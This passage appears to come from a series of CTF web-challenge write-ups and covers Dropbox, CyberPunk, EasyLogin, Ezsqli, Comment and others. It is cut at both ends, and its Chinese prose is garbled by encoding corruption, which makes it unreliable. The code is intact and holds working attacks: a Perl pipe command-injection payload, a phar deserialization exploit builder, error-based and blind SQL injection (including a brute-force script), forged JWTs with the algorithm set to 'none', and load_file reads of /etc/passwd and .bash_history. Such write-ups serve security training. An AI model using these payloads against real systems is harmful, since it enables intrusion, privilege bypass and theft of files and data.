highlight_file(__FILE__);\n```\n\nä¸¤çœ¼ä¸€è’™ï¼Œç›´æ¥[wp](https://blog.csdn.net/qq_49422880/article/details/121430262)ï¼Œæ˜¯æ–°çŸ¥è¯†è€¶\n\n> é¢˜ç›®çš„æ„æ€æ˜¯å…ˆä»¥MD5(orange .ip)ç”Ÿæˆä¸€ä¸ªhash,æ”¾åœ¨sandboxä¹‹ä¸‹ï¼Œç„¶åä½¿ç”¨GETå‘½ä»¤è¿›è¡Œè®¿é—®ï¼Œé‚£é‡Œå°±å¯ä»¥ä½¿ç”¨perl è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰§è¡Œçš„å‰ææ˜¯ å‰é¢å¿…é¡»è¦åˆ›å»ºä¸€ä¸ªå’Œè¿™ä¸ªå‘½ä»¤ä¸€æ ·çš„æ–‡ä»¶ã€‚ç„¶åå‘¢å°±æ˜¯å°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœæ”¾åˆ°æˆ‘ä»¬ä¼ è¿›å»çš„æ–‡ä»¶é‡Œé¢ã€‚\n\nå…ˆçœ‹çœ‹æ ¹ç›®å½•ä¸‹æœ‰ä»€ä¹ˆ\n\n```\n?url=/&filename=aaa\n```\n\nçœ‹åˆ°äº†readflagæ–‡ä»¶ï¼Œåº”è¯¥æ˜¯è¦åœ¨æ ¹ç›®å½•æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶æ‹¿åˆ°flagäº†\n\n> ä¸»è¦çš„çŸ¥è¯†ç‚¹ï¼šperlå‡½æ•°çœ‹åˆ°è¦æ‰“å¼€çš„æ–‡ä»¶åä¸­å¦‚æœä»¥ç®¡é“ç¬¦ï¼ˆé”®ç›˜ä¸Šé‚£ä¸ªç«–æ |ï¼‰ç»“å°¾ï¼Œå°±ä¼šä¸­æ–­åŸæœ‰æ‰“å¼€æ–‡ä»¶æ“ä½œï¼Œå¹¶ä¸”æŠŠè¿™ä¸ªæ–‡ä»¶åå½“ä½œä¸€ä¸ªå‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶ä¸”å°†å‘½ä»¤çš„æ‰§è¡Œç»“æœä½œä¸ºè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹å†™å…¥ã€‚è¿™ä¸ªå‘½ä»¤çš„æ‰§è¡Œæƒé™æ˜¯å½“å‰çš„ç™»å½•è€…ã€‚å¦‚æœä½ æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œä½ ä¼šçœ‹åˆ°perlç¨‹åºè¿è¡Œçš„ç»“æœã€‚\n\nçœ‹payload\n\n```\npayload1:\n/?url=file:bash -c /readflag|&filename=bash -c /readflag|\nè¿™ä¸€æ­¥æ˜¯å…ˆå°†bash -c /readflag|å†™å…¥åä¸ºbash -c /readflag|çš„æ–‡ä»¶é‡Œ\npayload2:\n/?url=file:bash -c /readflag|&filename=aaa\nè¿™ä¸€æ­¥æ˜¯è¦æ‰§è¡Œä¸Šä¸€æ­¥ä¸­å†™å…¥çš„å‘½ä»¤å¹¶æŠŠç»“æœæ”¾å…¥aaaæ–‡ä»¶ä¸­\npayload3:\n/sandbox/230317844a87b41e353b096d0d6a5145/aaa\n```\n\n## [CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox\n\næ³¨å†Œ->ç™»å½•->ä¸Šä¼ æ–‡ä»¶->å°è¯•ä¸‹è½½->å‘ç°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ŒæŸ¥çœ‹æºç \n\n```php\n//index.php\n<?php\ninclude \"class.php\";\n$a = new FileList($_SESSION['sandbox']);\n$a->Name();\n$a->Size();\n?>\n//download.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n\nif (!isset($_POST['filename'])) {\n    die();\n}\n\ninclude \"class.php\";\nini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\");\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) < 40 && $file->open($filename) && stristr($filename, \"flag\") === false) {\n    Header(\"Content-type: application/octet-stream\");\n    Header(\"Content-Disposition: attachment; filename=\" . basename($filename));\n    echo $file->close();\n} else {\n    echo \"File not exist\";\n}\n?>\n\n//class.php\n<?php\nerror_reporting(0);\n$dbaddr = \"127.0.0.1\";\n$dbuser = \"root\";\n$dbpass = \"root\";\n$dbname = \"dropbox\";\n$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);\n\nclass User {\n    public $db;\n\n    public function __construct() {\n        global $db;\n        $this->db = $db;\n    }\n\n    public function user_exist($username) {\n        $stmt = $this->db->prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->store_result();\n        $count = $stmt->num_rows;\n        if ($count === 0) {\n            return false;\n        }\n        return true;\n    }\n\n    public function add_user($username, $password) {\n        if ($this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\");\n        $stmt->bind_param(\"ss\", $username, $password);\n        $stmt->execute();\n        return true;\n    }\n\n    public function verify_user($username, $password) {\n        if (!$this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->bind_result($expect);\n        $stmt->fetch();\n        if (isset($expect) && $expect === $password) {\n            return true;\n        }\n        return false;\n    }\n\n    public function __destruct() {\n        $this->db->close();\n    }\n}\n\nclass FileList {\n    private $files;\n    private $results;\n    private $funcs;\n\n    public function __construct($path) {\n        $this->files = array();\n        $this->results = array();\n        $this->funcs = array();\n        $filenames = scandir($path);\n\n        $key = array_search(\".\", $filenames);\n        unset($filenames[$key]);\n        $key = array_search(\"..\", $filenames);\n        unset($filenames[$key]);\n\n        foreach ($filenames as $filename) {\n            $file = new File();\n            $file->open($path . $filename);\n            array_push($this->files, $file);\n            $this->results[$file->name()] = array();\n        }\n    }\n\n    public function __call($func, $args) {\n        array_push($this->funcs, $func);//å°†ä¸€ä¸ªfuncæ”¾å…¥funcs\n        foreach ($this->files as $file) {//filesä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå­˜æ”¾newå‡ºçš„å¯¹è±¡å¹¶è¿›è¡Œéå†\n            $this->results[$file->name()][$func] = $file->$func();\n          \t//resultsæ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œ[æ–‡ä»¶å][æ–¹æ³•]=æ–¹æ³•æ‰§è¡Œç»“æœ\n        }\n    }\n\n    public function __destruct() {\n        $table = '<div id=\"container\" class=\"container\"><div class=\"table-responsive\"><table id=\"table\" class=\"table table-bordered table-hover sm-font\">';\n        $table .= '<thead><tr>';\n        foreach ($this->funcs as $func) {\n            $table .= '<th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '</th>';\n        }\n        $table .= '<th scope=\"col\" class=\"text-center\">Opt</th>';\n        $table .= '</thead><tbody>';\n        foreach ($this->results as $filename => $result) {\n            $table .= '<tr>';\n            foreach ($result as $func => $value) {\n                $table .= '<td class=\"text-center\">' . htmlentities($value) . '</td>';\n            }\n            $table .= '<td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"><a href=\"#\" class=\"download\">ä¸‹è½½</a> / <a href=\"#\" class=\"delete\">åˆ é™¤</a></td>';\n            $table .= '</tr>';\n        }\n        echo $table;\n    }\n}\n\nclass File {\n    public $filename;\n\n    public function open($filename) {\n        $this->filename = $filename;\n        if (file_exists($filename) && !is_dir($filename)) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public function name() {\n        return basename($this->filename);\n    }\n\n    public function size() {\n        $size = filesize($this->filename);\n        $units = array(' B', ' KB', ' MB', ' GB', ' TB');\n        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;\n        return round($size, 2).$units[$i];\n    }\n\n    public function detele() {\n        unlink($this->filename);\n    }\n\n    public function close() {\n        return file_get_contents($this->filename);\n    }\n}\n?>\n\n```\n\nåº”è¯¥æ˜¯ååºåˆ—åŒ–äº†ï¼Œæç¤ºäº†pharåè®®ï¼Œæ­£å¥½å­¦ä¹ ä¸€ä¸‹\n\n#### pharç®€ä»‹\n\npharï¼Œå…¨ç§°ä¸ºPHP Archiveï¼Œpharæ‰©å±•æä¾›äº†ä¸€ç§å°†æ•´ä¸ªPHPåº”ç”¨ç¨‹åºæ”¾å…¥.pharæ–‡ä»¶ä¸­çš„æ–¹æ³•ï¼Œä»¥æ–¹ä¾¿ç§»åŠ¨ã€å®‰è£…ã€‚.pharæ–‡ä»¶çš„æœ€å¤§ç‰¹ç‚¹æ˜¯å°†å‡ ä¸ªæ–‡ä»¶ç»„åˆæˆä¸€ä¸ªæ–‡ä»¶çš„ä¾¿æ·æ–¹å¼ï¼Œ.pharæ–‡ä»¶æä¾›äº†ä¸€ç§å°†å®Œæ•´çš„PHPç¨‹åºåˆ†å¸ƒåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å¹¶ä»è¯¥æ–‡ä»¶ä¸­è¿è¡Œçš„æ–¹æ³•ã€‚å¯ä»¥å°†pharæ–‡ä»¶ç±»æ¯”ä¸ºä¸€ä¸ªå‹ç¼©æ–‡ä»¶\n\n```\npharæ–‡ä»¶ç»“æ„\n\n1. a stub\nå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸ºxxx<?php xxx; __HALT_COMPILER();?>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥__HALT_COMPILER();?>æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚\n\n2. a manifest describing the contents\npharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚\n\n3. the file contents\nè¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚\n\n4. [optional] a signature for verifying Phar integrity (phar file format only)\nç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾\n```\n\nå…ˆæ‰¾ååºåˆ—åŒ–é“¾å­å§\n\n> ä¼šå‘ç°åœ¨Fileç±»ä¸­æœ‰ä¸€ä¸ªclose()å‡½æ•°ï¼Œè¿™é‡Œè¿˜ç›´æ¥è°ƒç”¨file_get_comtents()å‡½æ•°,é‚£ä¹ˆä¸å¤šè¯´è¿™é‡Œç»å¯¹æ˜¯é“¾å­çš„ç»“å°¾ã€‚ä½†æ˜¯å¦‚æœåªç”¨è¿™ä¸¤ä¸ªç±»æ˜¯ä¸å¤Ÿçš„ï¼Œå› ä¸ºä¸èƒ½ç›´æ¥æ‰“å°å‡ºæ¥ã€‚æ‰€ä»¥å¾—ç»§ç»­ä¸‹ä¸€ä¸ªç±»FileListç»§ç»­ä½¿ç”¨ï¼Œæ­£å¥½é‡Œé¢ä¹Ÿæœ‰__callå‡½æ•°ã€‚funcæ˜¯è°ƒç”¨çš„æ–¹æ³•åï¼Œargsæ˜¯æ–¹æ³•çš„å‚æ•°\n> â€ƒ\n> é‚£ä¹ˆæˆ‘ä»¬å°±å°†$this->dbå¤åˆ¶ä¸ºFileListç±»è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä½¿ç”¨è¯¥ç±»ä¸­å¾—æ–¹æ³•ã€‚\n\n```PHP\n//exp.php\n<?php\n\nclass User{\n    public $db;\n    public function __construct() \n    {\n        $this->db = new FileList();\n    }\n}\n\nclass File{\n    public $filename;\n}\n\nclass FileList {\n    private $files;\n    public function __construct() \n    {\n        $file = new File();\n        $file->filename = '/flag.txt';\n        $this->files = array($file);\n    }\n\n}\n\n$User = new User();\n$phar = new Phar(\"./rabbit.phar\"); //.pharæ–‡ä»¶\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ? >');\n$phar->setMetadata($User); //è§¦å‘çš„å¤´æ˜¯Userç±»ï¼Œæ‰€ä»¥ä¼ å…¥Userå¯¹è±¡\n$phar->addFromString(\"test.txt\", \"test\"); //ç”Ÿæˆç­¾å\n$phar->stopBuffering();\n?>\n\n```\n\nåœ¨deleteé¡µé¢ä¼ å…¥phar://æ–‡ä»¶åå³å¯\n\n## [CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk\n\nçœ‹æºç å¾—åˆ°æç¤º`<!--?file=?-->`ä¼ªåè®®è¯»ä»£ç \n\n```php\n//confirm.php\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"address\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $address = $_POST[\"address\"];\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){\n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if($fetch->num_rows>0) {\n        $msg = $user_name.\"å·²æäº¤è®¢å•\";\n    }else{\n        $sql = \"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)\";\n        $re = $db->prepare($sql);\n        $re->bind_param(\"sss\", $user_name, $address, $phone);\n        $re = $re->execute();\n//change.php\n<?php\nrequire_once \"config.php\";\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"address\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $address = addslashes($_POST[\"address\"]);\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){\n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if (isset($fetch) && $fetch->num_rows>0){\n        $row = $fetch->fetch_assoc();\n        $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id'];\n        $result = $db->query($sql);\n        if(!$result) {\n            echo 'error';\n            print_r($db->error);\n            exit;\n        }\n        $msg = \"è®¢å•ä¿®æ”¹æˆåŠŸ\";\n    } else {\n        $msg = \"æœªæ‰¾åˆ°è®¢å•!\";\n    }\n}else {\n    $msg = \"ä¿¡æ¯ä¸å…¨\";\n}\n?>\n```\n\nå…³é”®åœ¨äºconfirmä¸­æ²¡æœ‰å¯¹ä¼ å…¥çš„addressè¿›è¡Œè¿‡æ»¤ï¼Œè€Œåœ¨changeä¸­åˆå¯¹æŸ¥è¯¢å‡ºçš„æ—§addressè¿›è¡Œäº†ä½¿ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ›´æ”¹åœ°å€çš„æ—¶å€™å°±ä¼šè§¦å‘æˆ‘ä»¬åœ¨confirmä¸­æäº¤çš„payload\n\n```\n1' where phone=updatexml(1,concat(0x7e,(select database()),0x7e),1)#\n1' where phone=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#\n```\n\næŸ¥å®Œåº“å’Œè¡¨å‘ç°å¥½åƒä¸æ˜¯åœ¨æ•°æ®åº“å†…ï¼Œload_fileçœ‹çœ‹æ–‡ä»¶\n\n```\n1' where phone=updatexml(1,concat(0x7e,(select load_file('/flag.txt')),0x7e),1)#\n```\n\næ‹¿åˆ°flag\n\n## [HFCTF2020]EasyLogin\n\næ³¨å†Œç™»å½•åç‚¹å‡»`GET FLAG`æ˜¾ç¤ºæƒé™ä¸è¶³ï¼ŒæŸ¥çœ‹è¿”å›å†…å®¹å‘ç°jwt\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-08 21.14.12.png)\n\nä¸‹ä¸€æ­¥ä¸çŸ¥é“å’‹èµ°äº†ï¼Œçœ‹wpæ˜¯è¦åˆ†ææºç \n\n```javascript\n//app.js\nfunction login() {\n    const username = $(\"#username\").val();\n    const password = $(\"#password\").val();\n    const token = sessionStorage.getItem(\"token\");\n    $.post(\"/api/login\", {username, password, authorization:token})\n        .done(function(data) {\n            const {status} = data;\n            if(status) {\n                document.location = \"/home\";\n            }\n        })\n        .fail(function(xhr, textStatus, errorThrown) {\n            alert(xhr.responseJSON.message);\n        });\n}\n\nfunction register() {\n    const username = $(\"#username\").val();\n    const password = $(\"#password\").val();\n    $.post(\"/api/register\", {username, password})\n        .done(function(data) {\n            const { token } = data;\n            sessionStorage.setItem('token', token);\n            document.location = \"/login\";\n        })\n        .fail(function(xhr, textStatus, errorThrown) {\n            alert(xhr.responseJSON.message);\n        });\n}\n\nfunction logout() {\n    $.get('/api/logout').done(function(data) {\n        const {status} = data;\n        if(status) {\n            document.location = '/login';\n        }\n    });\n}\n\nfunction getflag() {\n    $.get('/api/flag').done(function(data) {\n        const {flag} = data;\n        $(\"#username\").val(flag);\n    }).fail(function(xhr, textStatus, errorThrown) {\n        alert(xhr.responseJSON.message);\n    });\n}\n\n```\n\nè¿™é‡Œè´´ä¸€å¼ jsä»£ç ç»“æ„å›¾\n\n![](https://img-blog.csdnimg.cn/7b8b17a37cf94567bbc21edc080ab07b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc3VjYzM=,size_20,color_FFFFFF,t_70,g_se,x_16)\n\nçœ‹çœ‹controllersä¸­çš„app.js\n\n```javascript\n//controllers/app.js\nconst crypto = require('crypto');\nconst fs = require('fs')\nconst jwt = require('jsonwebtoken')\n\nconst APIError = require('../rest').APIError;\n\nmodule.exports = {\n    'POST /api/register': async (ctx, next) => {\n        const {username, password} = ctx.request.body;\n\n        if(!username || username === 'admin'){\n            throw new APIError('register error', 'wrong username');\n        }\n\n        if(global.secrets.length > 100000) {\n            global.secrets = [];\n        }\n\n        const secret = crypto.randomBytes(18).toString('hex');\n        const secretid = global.secrets.length;\n        global.secrets.push(secret)\n\n        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});\n\n        ctx.rest({\n            token: token\n        });\n\n        await next();\n    },\n\n    'POST /api/login': async (ctx, next) => {\n        const {username, password} = ctx.request.body;\n\n        if(!username || !password) {\n            throw new APIError('login error', 'username or password is necessary');\n        }\n\n        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;\n\n        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;\n\n        console.log(sid)\n\n        if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {\n            throw new APIError('login error', 'no such secret id');\n        }\n\n        const secret = global.secrets[sid];\n\n        const user = jwt.verify(token, secret, {algorithm: 'HS256'});\n\n        const status = username === user.username && password === user.password;\n\n        if(status) {\n            ctx.session.username = username;\n        }\n\n        ctx.rest({\n            status\n        });\n\n        await next();\n    },\n\n    'GET /api/flag': async (ctx, next) => {\n        if(ctx.session.username !== 'admin'){\n            throw new APIError('permission error', 'permission denied');\n        }\n\n        const flag = fs.readFileSync('/flag').toString();\n        ctx.rest({\n            flag\n        });\n\n        await next();\n    },\n\n    'GET /api/logout': async (ctx, next) => {\n        ctx.session.username = null;\n        ctx.rest({\n            status: true\n        })\n        await next();\n    }\n};\n```\n\nå¯ä»¥çœ‹åˆ°åŠ å¯†ç®—æ³•æ˜¯HS256ï¼Œå°è¯•å°†å…¶æ›´æ”¹ä¸ºNoneç›´æ¥ä¼ å…¥\n\n```python\nimport jwt\ntoken = jwt.encode(\n{\n  \"secretid\": [],\n  \"username\": \"admin\",\n  \"password\": \"aaaaa\",\n  \"iat\": 1649380156\n},\nalgorithm=\"none\",key=\"\").encode(encoding='utf-8')\n\nprint(token)\n```\n\nç™»å½•æˆåŠŸï¼\n\nè®¿é—®/api/flagæ‹¿åˆ°flag\n\n## [b01lers2020]Welcome to Earth\n\né˜´é—´é¢˜ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼\n\nè¿›å»å°±ç–¯ç‹‚è·³è½¬ï¼Œæ€»ä¹‹å°±æ˜¯ä¸æ–­æŸ¥çœ‹æºç ä¸è¦è·³è½¬åˆ°dieï¼Œæœ€ç»ˆè·³è½¬åˆ°fightæŸ¥çœ‹js\n\n```javascript\n// Run to scramble original flag\n//console.log(scramble(flag, action));\nfunction scramble(flag, key) {\n  for (var i = 0; i < key.length; i++) {\n    let n = key.charCodeAt(i) % flag.length;\n    let temp = flag[i];\n    flag[i] = flag[n];\n    flag[n] = temp;\n  }\n  return flag;\n}\n\nfunction check_action() {\n  var action = document.getElementById(\"action\").value;\n  var flag = [\"{hey\", \"_boy\", \"aaaa\", \"s_im\", \"ck!}\", \"_baa\", \"aaaa\", \"pctf\"];\n\n  // TODO: unscramble function\n}\n```\n\næŒ‰ç…§äººé—´è¯­æ³•æ‹¼å‡ºflag\n\n```\npctf{hey_boys_im_baaaaaaaaaack!}\n```\n\n## [WUSTCTF2020]CV Maker\n\nçœ‹åˆ°è¿™ç§æ¨¡ç‰ˆåŒ–çš„ç•Œé¢ï¼Œå°è¯•æ‰«ç›®å½•çœ‹çœ‹æ˜¯ä¸æ˜¯ä»£ç å®¡è®¡ï¼Œç»“æœæ²¡æœ‰ï¼Œä¹–ä¹–æ³¨å†Œç™»å½•ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ å¤´åƒï¼Œç©ºæ–‡ä»¶ç›´æ¥ä¸Šä¼ å‘ç°è­¦å‘Š\n\n```\nWarning: exif_imagetype(): Filename cannot be empty in /var/www/html/profile.php on line 76\n```\n\nemmmmmmmï¼Œä½¿ç”¨exif_imagetypeå¯ä½¿ç”¨å¹»æ•°å¤´ç»•è¿‡ï¼Œä¸Šä¼ æœ¨é©¬\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-08 22.05.39.png)\n\nè®¿é—®æ‹¿flagå³å¯\n\n## [GYCTF2020]Ezsqli\n\nå¸ƒå°”æ³¨å…¥å–µå–µï¼Œè„šæœ¬æ‡’å¾—è´´äº†å–µå–µ\n\n```\ndatabaseï¼šgive_grandpa_pa_pa_pa\n```\n\ninformation_schemaè¢«banäº†ï¼Œmysql.innodb_table_statsä¹Ÿè¢«banäº†ï¼Œæ–°æ–°çŸ¥è¯†å±…ç„¶è¿˜æœ‰ä¸ªèƒ½ç”¨çš„\n\n```mysql\nselect group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()\ntable:f1ag_1s_h3r3_hhhhh,users233333333333333\n1^((select ('~','~'))>(select * from f1ag_1s_h3r3_hhhhh))\n```\n\næœ€åå°±æ˜¯æ— åˆ—åæ³¨å…¥å•¦\n\n```python\nimport requests\nflagname=\"flag-{1234567890bcdefg}\"\nname=\",qwertyuioplkjhgfdsazxcvbnmQAZWSXEDCRFVTGBYHNUJMIKOLP1234567890\"\nurl=\"http://4664ea16-9fe4-4020-bc20-7e556fa70991.node4.buuoj.cn:81/index.php\"\nflag=\"\"\nfor i in range(1,100):\n    for j in range(33,128):\n        tmp=flag+chr(j)\n        data={'id':f\"0^((select 1,'{tmp}')>(select * from f1ag_1s_h3r3_hhhhh))\"}\n        tes=requests.post(url=url,data=data).text\n        if \"Nu1L\" in tes:\n            print(chr(j-1),end=\"\")\n            flag=flag+chr(j-1)\n            break\n```\n\n## [ç½‘é¼æ¯ 2018]Comment\n\nå…ˆçˆ†ç ´ç™»å½•ï¼Œzhangwei666\n\n.gitæ–‡ä»¶æ³„éœ²\n\nGitHackæ‰«å‡ºåå‘ç°ä»£ç å†…å®¹ä¸å…¨ï¼Œä½¿ç”¨Gitæ¢å¤æ—§ä»“åº“\n\n```php\n//write_do.php\n<?php\ninclude \"mysql.php\";\nsession_start();\nif($_SESSION['login'] != 'yes'){\n    header(\"Location: ./login.php\");\n    die();\n}\nif(isset($_GET['do'])){\nswitch ($_GET['do'])\n{\ncase 'write':\n    $category = addslashes($_POST['category']);\n    $title = addslashes($_POST['title']);\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into board\n            set category = '$category',\n                title = '$title',\n                content = '$content'\";\n    $result = mysql_query($sql);\n    header(\"Location: ./index.php\");\n    break;\ncase 'comment':\n    $bo_id = addslashes($_POST['bo_id']);\n    $sql = \"select category from board where id='$bo_id'\";\n    $result = mysql_query($sql);\n    $num = mysql_num_rows($result);\n    if($num>0){\n    $category = mysql_fetch_array($result)['category'];\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into comment\n            set category = '$category',\n                content = '$content',\n                bo_id = '$bo_id'\";\n    $result = mysql_query($sql);\n    }\n    header(\"Location: ./comment.php?id=$bo_id\");\n    break;\ndefault:\n    header(\"Location: ./index.php\");\n}\n}\nelse{\n    header(\"Location: ./index.php\");\n}\n?>\n```\n\nå¾ˆæ˜æ˜¾åœ¨commentå¤„å­˜åœ¨äºŒæ¬¡æ³¨å…¥ï¼Œåˆå› ä¸ºæ­¤å¤„insertæ˜¯å¸¦æœ‰æ¢è¡Œçš„ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ä½¿ç”¨#æ¥è¿›è¡Œæ³¨é‡Šï¼Œä½¿ç”¨/**/è¿›è¡Œå¤šè¡Œæ³¨é‡Šï¼Œæ„é€ payload\n\n```mysql\ncategory:0',content=database(),/*\nç•™è¨€commentå¤„:*/#\næœ€ç»ˆæ„é€ å‡ºçš„è¯­å¥\ninsert into comment\nset category = '0',content=database(),/*',\ncontent = '*/#',\nbo_id = '$bo_id'\";\n\ninsert into comment set category = '0',content=database(),bo_id = '$bo_id'\";\n```\n\nåœ¨å›æ˜¾ç•™è¨€å³å¯çœ‹åˆ°ç»“æœ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-09 08.47.30.png)\n\næŒ‰ç…§è¿™ä¸ªæ–¹æ³•æŸ¥å®Œå…¨åº“ä¹Ÿæ²¡æœ‰ç»“æœï¼Œå°è¯•loadfileå§ï¼Œä¸çŸ¥é“è¯»å•¥ï¼Œæä¸€ä¸‹wpçš„ç»“æœ\n\n> load_file(â€˜æ–‡ä»¶ç»å¯¹è·¯å¾„â€™)è¯»å–æ–‡ä»¶å¹¶è¿”å›æ–‡ä»¶å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚ä½¿ç”¨æ­¤å‡½æ•°ï¼Œè¯¥æ–‡ä»¶å¿…é¡»ä½äºæœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå¿…é¡»æŒ‡å®šå®Œæ•´è·¯å¾„çš„æ–‡ä»¶ï¼Œå¿…é¡»æœ‰FILEæƒé™ã€‚\n> ä¸€èˆ¬ç”¨æ³•æ­¥éª¤ï¼š\n> è¯»/etc/init.dä¸‹çš„ä¸œè¥¿ï¼Œè¿™é‡Œæœ‰é…ç½®æ–‡ä»¶è·¯å¾„\n> ?id=1' union select 1,2,load_file('/etc/init.d/httpd')\n> å¾—åˆ°webå®‰è£…è·¯å¾„\n> ?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')\n> è¯»å–å¯†ç æ–‡ä»¶\n> ?id=1' union select 1,2,load_file('var/www/html/xxx.com/php/conn.inc.php')\n\nå…ˆçœ‹/etc/passwd\n\n```\nwww:x:500:500:www:/home/www:/bin/bash\n```\n\nå¾—åˆ°è·‘webæœåŠ¡çš„ç”¨æˆ·\n\n> æ¯ä¸ªåœ¨ç³»ç»Ÿä¸­æ‹¥æœ‰è´¦å·çš„ç”¨æˆ·åœ¨ä»–çš„ç›®å½•ä¸‹éƒ½æœ‰ä¸€ä¸ªâ€œ.bash_historyâ€æ–‡ä»¶ï¼Œä¿å­˜äº†å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤ï¼Œæ–¹ä¾¿æŸ¥æ‰¾ã€‚\n\nè®¿é—®æ‹¿åˆ°ç”¨è¿‡çš„å‘½ä»¤\n\n```\ncd /tmp/ \nunzip html.zip \nrm -f html.zip \ncp -r html /var/www/ \ncd /var/www/html/ \nrm -f .DS_Store \nservice apache2 start\n```\n\nè®¿é—®/tmp/html/.DS_Storeæ‹¿åˆ°æ–‡ä»¶å¤¹å†…å®¹ï¼Œå¤ªé•¿å†…å®¹å¯èƒ½åŒ…å«sqlè¯­å¥ï¼Œä½¿ç”¨16è¿›åˆ¶ç¼–ç ï¼Œå‘ç°æ–‡ä»¶`flag_8946e1ff1ee3e40f.php`ï¼Œè¯»å–æ‹¿flagå³å¯ï¼Œè®°å¾—è¯»/var/www/htmlä¸‹çš„æ–‡ä»¶ï¼Œtmpä¸­çš„ä¸æ­£ç¡®\n\n## [watevrCTF-2019]Cookie Store\n\ncookiebase64è§£ä¸€ä¸‹ç„¶åæ”¹äº†ä»·æ ¼å†ä¼ 